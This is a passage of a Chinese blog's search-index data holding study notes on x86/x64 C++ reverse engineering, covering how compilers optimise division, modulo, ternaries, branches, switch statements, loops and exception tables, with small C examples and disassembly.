","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:10:2","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"循坏语句 同32位. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:10:3","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"除法 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:11:0","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"无符号除法 除数为2的幂 int main(int argc, char* argv[]) { printf(\"argc / 16 = %u\", (unsigned)argc / 16); system(\"pause\"); return 0; } 除数为非2的幂 MagicNumber无进位 int main(int argc, char* argv[]) { printf(\"argc / 3 = %I64u\", (unsigned long long)argc / 3); system(\"pause\"); return 0; } 特征 x / 除数 = x * M64 \u003e\u003e (64 + n) 还原 除数 = 2 ^ (64 + n) / M64, 向上取整 MagicNumber有进位 int main(int argc, char* argv[]) { printf(\"argc / 7 = %u\", (unsigned)argc / 7); system(\"pause\"); return 0; } 特征 乘减移加移 x / 除数 = (((x - (x * M \u003e\u003e 32)) \u003e\u003e n1) + (x * M \u003e\u003e 32)) \u003e\u003e n2 还原 除数 = 2 ^ (32 + n) / (2 ^ 32 + M), 向上取整 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:11:1","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"有符号除法 除数为正2的幂 int main(int argc, char* argv[]) { printf(\"argc / 8 = %d\", argc / 8); system(\"pause\"); return 0; } 特征 x \u003e= 0:x / 除数 = x \u003e\u003e n x \u003c 0 :x / 除数 = (x + (2 ^ n - 1)) \u003e\u003e n 还原 除数 = 2 ^ n 除数为正非2的幂 MagicNumber为正 int main(int argc, char* argv[]) { printf(\"argc / 9 = %lld\", (long long)argc / 9); system(\"pause\"); return 0; } 特征 x \u003e= 0: x / 除数 = x * M64 \u003e\u003e (64 + n) x \u003c 0: x / 除数 = ((x * M64) \u003e\u003e (64 + n)) + 1) 还原 除数 = 2 ^ (64 + n) / M64, 向上取整 MagicNumber为负 int main(int argc, char* argv[]) { printf(\"argc / 7 = %d\", argc / 7); system(\"pause\"); return 0; } 特征 x \u003e= 0: x / 除数 = (x * M + x) \u003e\u003e (32 + n) x \u003c 0: x / 除数 = ((x * M + x) \u003e\u003e (32 + n)) + 1) 还原 除数 = 2 ^ (32 + n) / M, 向上取整 除数为负2的幂 int main(int argc, char* argv[]) { printf(\"argc / -16 = %lld\", (long long)argc / -16); system(\"pause\"); return 0; } 除数为负非2的幂 MagicNumber为正 int main(int argc, char* argv[]) { printf(\"argc / -7 = %d\", argc / -7); system(\"pause\"); return 0; } 特征 x \u003e= 0: x / 除数 = (x * M - x) \u003e\u003e (32 + n) x \u003c 0: x / 除数 = ((x * M - x) \u003e\u003e (32 + n)) + 1) 还原 除数 = 2 ^ (32 + n) / (2 ^ 32 - M), 向上取整 MagicNumber为负 int main(int argc, char* argv[]) { printf(\"argc / -10 = %lld\", (long long)argc / -10); system(\"pause\"); return 0; } 特征 x \u003e= 0: x / 除数 = x * M64 \u003e\u003e (64 + n) x \u003c 0: x / 除数 = ((x * M64) \u003e\u003e (64 + n)) + 1) 总结 除数 = 2 ^ (64 + n) / (2 ^ 64 - M64), 向上取整 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:11:2","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"总结 x / 除数 = x * M \u003e\u003e (32 + n) 结论: M \u003e 0: x / 正除数, 除数 = 2 ^ (32 + n) / M, 向上取整 M \u003c 0: x / 负除数, 除数 = 2 ^ (32 + n) / (2 ^ 32 - M ), 向上取整 x / 除数 = (x * M + x) \u003e\u003e (32 + n) 结论: M \u003c 0: x / 正除数, 除数 = 2 ^ (32 + n) / M, 向上取整 x / 除数 = (x * M - x) \u003e\u003e (32 + n) 结论: M \u003e 0: x / 负除数, 除数 = 2 ^ (32 + n) / (2 ^ 32 - M ), 向上取整 ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:11:3","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"取模 余数的符号与被除数相同. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:12:0","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"基本公式 商 = 被除数 / 除数 余数 = 被除数 - 商 * 除数 int main(int argc, char* argv[]) { printf(\"argc % 3 = %d\", argc % 3); system(\"pause\"); return 0; } Release ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:12:1","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"无符号模2的幂 int main(int argc, char* argv[]) { printf(\"%d\", (unsigned)argc % 4); system(\"pause\"); return 0; } Release 特征 x % (2 ^ n) = x \u0026 (2 ^ n - 1) ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:12:2","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"有符号模2的幂 优化1 int main(int argc, char* argv[]) { printf(\"%d\", argc % 4); system(\"pause\"); return 0; } Release 优化二 int main(int argc, char* argv[]) { printf(\"%lld\\n\", argc % 512); system(\"pause\"); return 0; } Release mov rax, [rsp+28h+arg_8] lea rcx, aLld_0 ; \"%lld\\n\" cqo and edx, 511 add rax, rdx and eax, 511 sub rax, rdx mov rdx, rax call sub_1400011F0 特征 x \u003e 0: x % (2 ^ n) = x \u0026 (2 ^ n - 1) x \u003c 0: x % (2 ^ n) = ((x + (2 ^ n - 1) \u0026 (2 ^ n - 1)) - (2 ^ n - 1) ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:12:3","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"C++逆向 64位程序,只能通过函数内是否有虚表,判断是否是构造函数. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:13:0","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"判断继承 构造函数中,调父类构造,且同一位置,写两次虚表. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:13:1","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"异常 为了解决频繁注册注销SEH,直接将异常表做好,当发生异常时,系统就会去.pdata节,找异常表..pdata节中的数据按RUNTIME_FUNCTION这个结构体进行解析(里面的地址是RVA). 00000000 RUNTIME_FUNCTION struc; (sizeof = 0xC, mappedto_5) 00000000 FunctionStart dd ? ; offset rva 00000004 FunctionEnd dd ? ; offset rva pastend 00000008 UnwindInfo dd ? ; offset rva 0000000C RUNTIME_FUNCTION ends ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:14:0","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"UNWIND_INFO结构体 typedef struct _UNWIND_INFO { UBYTE Version : 3; UBYTE Flags : 5; UBYTE SizeOfProlog; UBYTE CountOfCodes; UBYTE FrameRegister : 4; UBYTE FrameOffset : 4; UNWIND_CODE UnwindCode[1]; /* UNWIND_CODE MoreUnwindCode[((CountOfCodes + 1) \u0026 ~1) - 1]; * union { * OPTIONAL ULONG ExceptionHandler; * OPTIONAL ULONG FunctionEntry; //异常处理函数RVA, 可有可无,看Flag * }; * OPTIONAL ULONG ExceptionData[]; */ //FunctionInfo的RVA } UNWIND_INFO, *PUNWIND_INFO; //Flag #define UNW_FLAG_NHANDLER 0x0 #define UNW_FLAG_EHANDLER 0x1 //置位, 说明有一个C++异常回调函数 #define UNW_FLAG_UHANDLER 0x2 //置位, 说明有一个C异常回调函数 #define UNW_FLAG_CHAININFO 0x4 00000000 UNWIND_INFO_HDR struc; (sizeof = 0x4, mappedto_6) 00000000 Ver3_Flags db ? ; base 16 00000001 PrologSize db ? ; base 16 00000002 CntUnwindCodes db ? ; base 16 00000003 FrReg_FrRegOff db ? ; base 16 00000004 UNWIND_INFO_HDR ends ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:14:1","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"UNWIND_CODE结构体 typedef union _UNWIND_CODE { struct { UBYTE CodeOffset; UBYTE UnwindOp : 4; UBYTE OpInfo : 4; }; USHORT FrameOffset; } UNWIND_CODE, *PUNWIND_CODE; 00000000 UNWIND_CODE struc; (sizeof = 0x2, mappedto_7) 00000000 PrologOff db ? ; base 16 00000001 OpCode_OpInfo db ? ; base 16 00000002 UNWIND_CODE ends ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:14:2","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"定位Catch代码块 int main(int argc, char* argv[]) { try { if (argc == 1) { throw 1; } else { throw 3.14; } } catch (int nVal) { printf(\"catch (int nVal) %d\\r\\n\", nVal); } catch (double dbl) { printf(\"catch (double dbl) %lf\\r\\n\", dbl); } system(\"pause\"); return 0; } 定位有异常处理函数的RUNTIME_FUNCTION结构. 定位UNWIND_INFO结构体. 定位FuncInfo结构体. 根据异常关系信息表,定位Catch代码块. 接下来的故事,就跟32位中,定位Catch代码块的步骤一样了. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:14:3","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"注意 __CxxFrameHandler3 兼容之前的SEH异常处理,参数是FuncInfo的结构体指针. __CxxFrameHandler4 更新版本的SEH异常处理,参数是FuncInfo4的结构体指针,在ehdata4_export.h头文件定义. ","date":"2022-02-15","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/:14:4","tags":["C++逆向"],"title":"x64逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x64%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"x86逆向 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:0:0","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"除法 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:1:0","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"约定 两个无符号相除,结果仍然是无符号. 两个有符号相除,结果是有符号. 有符号数和无符号数混除,结果是无符号的. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:1:1","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"基本概念 在C语言和其他多数高级语言中,对整数除法规定为向零取整. 向下取整 取得往负无穷方向接近x的整数值. 向下取整的除法,当除数为2的幂时,可以直接用带符号右移指令(sar)来完成. 但是,向下取整存在一个问题: $$ ⌊\\frac{-a}{b}⌋ \\not= -⌊\\frac{a}{b}⌋ (假设\\frac{a}{b}结果不为整数) $$ 向上取整 取得往正无穷方向接近x的整数值. 向上取整也存在一个问题: $$ ⌈\\frac{-a}{b}⌉ \\not= -⌈\\frac{a}{b}⌉ (假设\\frac{a}{b}结果不为整数) $$ 向零取整 取得往0方向最接近x的整数值. 向零取整的除法满足: $$ [\\frac{-a}{b}] = [\\frac{a}{-b}] =-[\\frac{a}{b}] $$ ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:1:2","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"无符号除法 除数为变量 除数为变量的时候是没有优化,只能使用除法指令,这里的变量是指类似argc这类在编译期间不能计算的变量. int main(unsigned int argc, char* argv[]) { printf(\"%d \\r\\n\", 10 / argc); return 0; } 除数为2的幂 int main(unsigned int argc, char* argv[]) { printf(\"%d\", argc / 4); return 0; } 除数为非2的幂 MagicNumber无进位 int main(unsigned int argc, char* argv[]) { printf(\"%d \\r\\n\", argc / 3); return 0; } 推导 特征 mov eax, MagicNumber mul 被除数 shr edx, n ;这条指令可无 还原 除数 = 2^(32 + n) / MagicNumber 结果向上取整 MagicNumber有进位 int main(unsigned int argc, char* argv[]) { printf(\"%d\", argc / 7); return 0; } 推导 特征 #乘减移加移 mov reg, 被除数 mov eax, MagicNumber mul reg sub reg, edx shr reg, 1 add reg, edx shr reg, A; 这句可能没有 ;此后直接使用reg的值, eax弃而不用 还原 统计右移次数,n = 32 + 1 + A 除数 = 2^n / (2^32 + MagicNumber) 结果向上取整 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:1:3","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"有符号除法 除数为正2的幂 int main(int argc, char* argv[]) { printf(\"%d \\r\\n\", argc / 8); return 0; } 推导 特征 mov eax, 被除数 cdq and edx, 2 ^ n - 1 add eax, edx sar eax, n 还原 除数 = 2^n 除数为正非2的幂 MagicNumber为正 int main(int argc, char* argv[]) { printf(\"%d \\r\\n\", argc / 5); return 0; } 推导 特征 mov reg, 被除数 mov eax, MagicNumber ;(MagicNumber \u003c= 0x7FFFFFFF) imul reg sar edx, n ;没有这条指令则指数为32 mov reg, edx shr reg, 1Fh add edx, reg ;此后直接使用edx的值 MagicNumber为正 乘法和移位之间无调整 还原 除数 = 2^(32 + n) / MagicNumber 结果向上取整 MagicNumber为负 int main(int argc, char* argv[]) { printf(\"%d\", argc / 73); return 0; } 推导 在16位机器上计算无符号数0x8086与有符号数A,保证计算结果正确. 0x8086用imul指令会被当做负数,用补码进行计算 计算机计算= - ~0x8086 * A = - (0x10000 - 0x8086) * A =(0x8086 - 0x10000) * A =0x8086 * A - 0x10000 * A 而我们想要得到0x8086 * A,故计算出来的结果应加上0x10000 * A 对应上图中的add edx, ecx 特征 mov reg, 被除数 mov eax, MagicNumber ;(MagicNumber \u003e 7FFFFFFFh) imul reg add edx, reg sar edx, n ;没有这条指令则指数为32 mov reg, edx shr reg, 1Fh add edx, reg ;此后直接使用edx的值 MagicNumber为负 乘法和移位之间有加调整 还原 除数 = 2^(32 + n) / MagicNumber 结果向上取整 除数为负2的幂 int main(int argc, char* argv[]) { printf(\"%d\", argc / -8); return 0; } 推导 特征 mov eax, 被除数 cdq and edx, 2^n - 1 add eax, edx sar eax, n neg eax 还原 除数 = - 2^n 除数为负非2的幂 MagicNumber为正 int main(int argc, char* argv[]) { printf(\"%d\", argc / -73); return 0; } 推导 在16位机器上计算无符号数0x8086与有符号数A,保证计算结果正确. 0x8086用imul指令会被当做负数,用补码进行计算 计算机计算= - ~0x8086 * A = - (0x10000 - 0x8086) * A =(0x8086 - 0x10000) * A =0x8086 * A - 0x10000 * A 假设上面0x8086为MagicNumber 我们的MagicNumber为正,故-0x8086假定是MagicNumber 所以上面的计算机计算结果应加上符号,变为 -(0x8086 * A - 0x10000 * A) =-0x8086 * A + 0x10000 * A 但我们想得到-0x8086 * A，故应再加上0x10000 * A 对应上图中的sub edx, ecx 特征 mov reg, 被除数 mov eax, MagicNumber imul reg sub edx, reg sar edx, n ;没有这句, 指数为32 mov reg, edx shr reg, 1Fh add edx, eax ;此后使用edx的值 MagicNumber为正 乘法和移位之间有减调整 还原 先将MagicNumber求补(取反+1)拿到原来的MagicNumbeSrc 除数的绝对值 = 2^(32 + n) /MagicNumberSrc 结果向上取整 除数为负 由于MagicNumber为正,故求补得到的MagicNumberSrc为负 注意参与计算的MagicNumSrc应当做无符号数进行计算 本例中MagicNumber = 0x1F8FC7E3 MagicNumberSrc = 0xE070381D, 对应的无符号十进制数为3765450781 故除数的绝对值 = 2^38 / 3765450781 结果向上取整为73 再添加负号就还原了除数为-73 MagicNumber为负 int main(int argc, char* argv[]) { printf(\"%d\", argc / -5); return 0; } 推导 A/(-C),C\u003e0 -\u003e -A * M \u003e\u003e n -\u003e A * -M \u003e\u003e n 故汇编显示的MagicNumber为原来MagicNumber求补后的结果. 特征 mov reg, 被除数 mov eax, MagicNumber imul reg sar edx, n ;没有这句, 指数为32 mov reg, edx shr reg, 1Fh add edx, reg ;此后使用edx的值 MagicNumber为负 乘法和移位之间没有调整 还原 先将MagicNumber求补(取反+1)拿到原来的MagicNumbeSrc 除数的绝对值 = 2^(32 + n) /MagicNumberSrc 结果向上取整 除数为负 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:1:4","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"取模 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:2:0","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"基础 模的符号与被除数相同. 除数为变量,无优化,只有当除数为常量时,才有优化空间. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:2:1","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"无符号取模 除数为2的幂 int main(unsigned int argc, char* argv[]) { printf(\"%d\\r\\n\", argc % 8); return 0; } 推导 对2的n次方取模,实际上是取该数值的二进制低n位 如10进制中,321%100,我们取321的低2位,就可以知道余数为21 特征 mov reg, 被除数 and reg, 2 ^ n - 1 还原 除数 = 2^n 除数为非2的幂 int main(unsigned int argc, char* argv[]) { printf(\"%d\\r\\n\", argc % 7); return 0; } 推导 余数 = 被除数 - 商 * 除数 还原 可以通过上面的除法部分得到除数 也可以通过中间商乘以除数的部分得到除数 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:2:2","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"有符号取模 除数为正2的幂 带分支 int main(int argc, char* argv[]) { printf(\"%d\\r\\n\", argc % 8); return 0; } 推导 mov eax, [esp+argc] ;将被除数给eax and eax, 80000007h ;取被除数的符号位和低n位 jns short loc_401010 ;如果被除数为正,跳走,直接使用eax dec eax ;处理负数取模为0的情况 减1后为全f,如果取模不为0的情况是不需要dec和inc指令 or eax, 0FFFFFFF8h ;被除数为负,需要将模的结果高位填补为1 inc eax ;处理负数取模为0的情况 上面减后全为f,此处加1,调整为0 loc_401010: ;使用eax 特征 mov reg, 被除数 and reg, 0x8000000(2^n - 1) jns LABLE dec reg or reg, 0xFFFFFFF(2^n) inc reg LABLE: ;使用reg 还原 除数 = 2^n 不带分支 见除数为负2的幂. 除数为正非2的幂 int main(int argc, char* argv[]) { printf(\"%d\\r\\n\", argc % 7); return 0; } 推导 余数 = 被除数 - 商 * 除数 还原 可以通过上面的除法部分得到除数 也可以通过中间商乘以除数的部分得到除数 除数为负2的幂 int main(int argc, char* argv[]) { printf(\"%d\\r\\n\", argc % -8); return 0; } 推导 对2的n次方取模,实际上是取该数值的二进制低n位 模的符号与被除数相同 还原 上图中的7为2^n - 1 除数 = 2^n 除数为负非2的幂 int main(int argc, char* argv[]) { printf(\"%d\\r\\n\", argc % -7); return 0; } 推导 余数 = 被除数 - 商 * 除数 还原 可以通过上面的除法部分得到除数 也可以通过中间商乘以除数的部分得到除数 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:2:3","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"三目运算 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:3:0","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"基础 表达式1 ? 表达式2 : 表达式3,只有当表达式2和表达式3为常量时,才可以优化,否则和if分支语句产生的代码一样. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:3:1","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"低版本优化 原型 int main(int argc, char* argv[]) { printf(\"%d\\r\\n\", argc == 0 ? 0 : -1); return 0; } 特征 mov reg, 表达式1中的第1项值 neg reg sbb reg, reg 演变1 int main(int argc, char* argv[]) { printf(\"%d\\r\\n\", argc == 100 ? 6 : 2); return 0; } 特征 mov reg,表达式1第一项值 sub reg, 表达式1第二项值 neg reg sbb reg, reg and rl, 表达式3-表达式2 add reg, 表达式2 演变2 int main(int argc, char* argv[]) { printf(\"%d\\r\\n\", argc \u003e 100 ? 2 : 6); return 0; } ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:3:2","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"高版本优化 int main(int argc, char* argv[]) { printf(\"%d\\r\\n\", argc \u003e= 100 ? 5 : 2); return 0; } ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:3:3","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"流程控制语句 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:4:0","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"IF 单分支结构 int main(int argc, char* argv[]) { if (argc \u003e 10) { printf(\"argc \u003e 10\\r\\n\"); } return 0; } 特征 IF_BEGIN jxx IF_END . . ;中间为条件体 . ;注意语句上面无跳转 IF_END 双分支结构 代码外提 int main(int argc, char* argv[]) { if (argc \u003e 10) { printf(\"argc \u003e 10\\r\\n\"); } else { printf(\"argc \u003c= 10\\r\\n\"); } system(\"pause\"); return 0; } 特征 IF_BEGIN jxx ELSE_BEGIN ... IF_END jmp ELSE_END ELSE_BEGIN ... ELSE_END 代码内提 int main(int argc, char* argv[]) { if (argc \u003e 10) { printf(\"argc \u003e 10\\r\\n\"); } else { printf(\"argc \u003c= 10\\r\\n\"); } return 0; } 多分支结构 int main(int argc, char* argv[]) { if (argc \u003e 10) { printf(\"argc \u003e 10\\r\\n\"); } else if (argc \u003c 10) { printf(\"argc \u003c 10\\r\\n\"); } else { printf(\"argc == 10\\r\\n\"); } system(\"pause\"); return 0; } 特征 IF_BEGIN jxx ELSE_IF_BEGIN ... IF_END jmp ELSE_END ELSE_IF_BEGIN jxx ELSE_BEGIN ... ELSE_IF_END jmp ELSE_END ELSE_BEGIN ... ELSE_END ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:4:1","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"SwitchCase Case语句\u003c=3 int main(int argc, char* argv[]) { switch (argc) { case 0: printf(\"argc == 0\\r\\n\"); case 1: printf(\"argc == 1\\r\\n\"); break; case 2: printf(\"argc == 2\\r\\n\"); break; default: printf(\"default\\r\\n\"); } system(\"pause\"); return 0; } Debug Release 特征 一个个比较,中间无代码块 这样的话,匹配跳转成功时,没有break语句会继续向下执行 case语句\u003e3,且每两个Case值之间的差值\u003c=6 int main(int argc, char* argv[]) { switch (argc) { case 0: printf(\"argc == 0\\r\\n\"); case 1: printf(\"argc == 1\\r\\n\"); break; case 2: printf(\"argc == 2\\r\\n\"); break; case 8: printf(\"argc == 8\\r\\n\"); break; default: printf(\"default\\r\\n\"); } system(\"pause\"); return 0; } Debug Release 特征 编译器会给所有case情况做一个表 当提供的序号大于最大索引时,直接跳转到DEFAULT或SWITCH_END case语句\u003e3,最大case值-最小case值\u003c=255 int main(int argc, char* argv[]) { switch (argc) { case 0: printf(\"argc == 0\\r\\n\"); case 46: printf(\"argc == 46\\r\\n\"); break; case 55: printf(\"argc == 55\\r\\n\"); break; case 77: printf(\"argc == 77\\r\\n\"); break; default: printf(\"default\\r\\n\"); } system(\"pause\"); return 0; } Debug Release 特征 编译器会生成两个表 下标表:记录对应case地址表的下标 case地址表:记录case语句块的地址 还原 case语句\u003e3,最大case值-最小case值\u003e255 int main(int argc, char* argv[]) { switch (argc) { case 0: printf(\"argc == 0\\r\\n\"); case 46: printf(\"argc == 46\\r\\n\"); break; case 555: printf(\"argc == 555\\r\\n\"); break; case 777: printf(\"argc == 777\\r\\n\"); break; case 888: printf(\"argc == 888\\r\\n\"); break; default: printf(\"default\\r\\n\"); } system(\"pause\"); return 0; } Debug Release 特征 二分优化 注意:会进行二分优化和前面三种混合优化 注意 break语句,对应的跳转一定是跳向SWITCH_END. ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:4:2","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"循环语句 DoWhile int main(int argc, char* argv[]) { int nSum = 0; int n = 1; do { nSum += n; n++; } while (n \u003c= 100); printf(\"%d\\r\\n\", nSum); system(\"pause\"); return 0; } Debug Release 特征 Do_Begin ... ... ... jxx Do_Begin Do_End While int main(int argc, char* argv[]) { int nSum = 0; while (argc \u003c= 100) { nSum += argc; argc++; } printf(\"%d\\r\\n\", nSum); system(\"pause\"); return 0; } Debug 特征 While_Begin jxx While_End ... ... ... jmp While_Begin While_End Release 特征 这个地方While循环会被优化成DoWhile循环 多了一个跳转提前进行判断 注意:跳转的判定条件和循环的判定条件具有相关性时,才可还原为While循环 For int main(int argc, char* argv[]) { int nSum = 0; for (int i = 0; i \u003c= 100; i++) { nSum += i; } printf(\"%d\\r\\n\", nSum); system(\"pause\"); return 0; } Debug 特征 For_Init ... jmp For_Cmp For_Step ... For_Cmp jxx For_End For_Body ... ... jmp For_Step For_End Release 特征 被优化为DoWhile循环 注意 //Break语句 循环语句中,跳转循环体,可识别为break语句 //Continue语句 Release版,经常会将Continue语句优化为If_Else双分支结构 ","date":"2022-02-14","objectID":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/:4:3","tags":["C++逆向"],"title":"x86逆向","uri":"/posts/windows%E7%9B%B8%E5%85%B3/x86%E9%80%86%E5%90%91/"},{"categories":["Win相关"],"content":"函数调用方式 